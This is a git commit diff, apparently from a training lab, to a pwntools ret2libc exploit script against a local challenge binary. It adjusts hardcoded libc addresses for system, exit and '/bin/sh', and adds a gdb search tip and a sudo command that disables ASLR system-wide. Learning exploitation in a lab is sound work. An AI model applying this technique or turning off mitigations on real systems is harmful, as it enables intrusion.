8cea06a2292d5776c0a06250807a181897a14ada
LUU QUANG MINH <Minh.LuuQuang@vn.bosch.com>
2025-03-16 00:16:27 +0700

    Add more info -> more hint
    Signed-off-by: LUU QUANG MINH <Minh.LuuQuang@vn.bosch.com>

--- 5_ret2lib/tools/pwn_r2l.py
+++ 5_ret2lib/tools/pwn_r2l.py
@@ -14,9 +14,9 @@ if args.mode in ["d", "debug"]:
     atk = process('./vanished_shell')
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
     chall = ELF('./vanished_shell', checksec=True)
-    payload_system = p32(0xf7dd38e0)
-    payload_exit = p32(0xf7dc25b0)
-    payload_sh = p32(0xf7f40de8)
+    payload_system = p32(0xf7dd38e0) # p system
+    payload_exit = p32(0xf7dc25b0) # p exit
+    payload_sh = p32(0xf7f3ede8)
 else:
     atk = remote('localhost', 1335)
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
@@ -24,6 +24,16 @@ else:
     payload_system = p32(0xf7dd88e0)
     payload_exit = p32(0xf7dc75b0)
     payload_sh = p32(0xf7f45de8)
+
+# Trick the tool:
+    # find system,+999999999,"/bin/sh"
+    # 0xf7f45de8
+    # warning: Unable to access 16000 bytes
+    # of target memory at 0xf7fbb0f0,
+    # halting search. 1 pattern found.
+
+# Must turn off ASLR
+# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 # Payloads
 offset = b"A" * 76
